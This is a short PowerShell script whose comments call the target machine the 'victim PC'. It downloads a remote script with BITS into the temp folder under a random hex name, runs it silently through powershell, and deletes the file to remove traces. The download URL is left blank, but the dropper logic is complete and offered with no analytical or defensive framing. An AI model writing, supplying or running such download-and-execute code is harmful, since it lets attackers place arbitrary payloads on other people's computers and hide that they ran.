#Path of the target to download
$DownPath=""
#Select a random value for give a random hex name of the script
$NumRan=Get-random
$var=([Convert]::ToString($NumRan, 16))+".ps1"
#path on the victim PC
$FilePath= $env:temp+"\"+$var
#Show the path
$FilePath
#Launch the download
Start-BitsTransfer -Source $DownPath -Destination $FilePath 
#Go on the Path, execute the payload and clean the payload file 
Set-Location $env:temp
".\"+$var |powershell - |Out-null
Remove-Item "$var"
